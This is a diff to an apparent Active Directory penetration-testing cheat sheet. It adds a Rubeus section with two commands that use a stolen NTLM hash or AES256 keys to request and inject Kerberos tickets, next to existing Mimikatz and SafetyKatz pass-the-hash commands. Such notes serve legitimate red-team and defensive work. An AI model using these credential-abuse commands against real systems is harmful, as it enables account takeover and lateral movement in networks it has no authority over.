@@ -83,6 +83,17 @@ Invoke-Mimikatz -Command '"sekurlsa::pth /user:<USER> /domain:<DOMAIN> /ntlm:<HA
 SafetyKatz.exe "sekurlsa::pth /user:<USER> /domain:<DOMAIN> /aes256:<AES256KEYS> /run:cmd.exe" "exit" 
 ```
 
+#### Rubeus
+- Below doesn't need elevation
+```
+Rubeus.exe asktgt /user:<USER> /rc4:<NTLM HASH> /ptt
+```
+
+- Below command needs elevation
+```
+Rubeus.exe asktgt /user:<USER> /aes256:<AES256KEYS> /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
+```
+
 ## Mimikatz
 #### Mimikatz dump credentials on local machine
 ```
